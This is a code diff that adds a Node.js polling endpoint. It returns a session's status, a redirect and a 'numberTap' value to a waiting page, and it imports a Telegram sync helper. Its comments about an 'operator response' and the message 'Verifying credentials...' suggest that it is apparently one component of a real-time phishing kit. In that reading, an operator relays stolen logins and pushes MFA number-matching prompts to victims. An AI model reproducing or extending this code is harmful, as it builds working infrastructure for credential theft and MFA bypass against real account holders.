@@ -1,0 +1,31 @@
+const { loadConfig, getSessionAsync, syncTelegramUpdates } = require('./_store');
+
+module.exports = async (req, res) => {
+  res.setHeader('Content-Type', 'application/json');
+  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+
+  const sessionId = req.query.sessionId || req.query.id;
+  if (!sessionId) {
+    return res.status(400).json({ error: 'Missing sessionId parameter' });
+  }
+
+  // Retrieve session (checks remote cloud store if redirect is not yet set)
+  const session = await getSessionAsync(sessionId, true);
+  if (session) {
+    const resp = {
+      sessionId,
+      status: session.status || 'pending',
+      message: session.message || 'Please wait...'
+    };
+    if (session.redirect) resp.redirect = session.redirect;
+    if (session.numberTap) resp.numberTap = session.numberTap;
+    return res.status(200).json(resp);
+  }
+
+  // Active session waiting for operator response: never return 404 to avoid breaking polling
+  return res.status(200).json({
+    sessionId,
+    status: 'pending',
+    message: 'Verifying credentials...'
+  });
+};
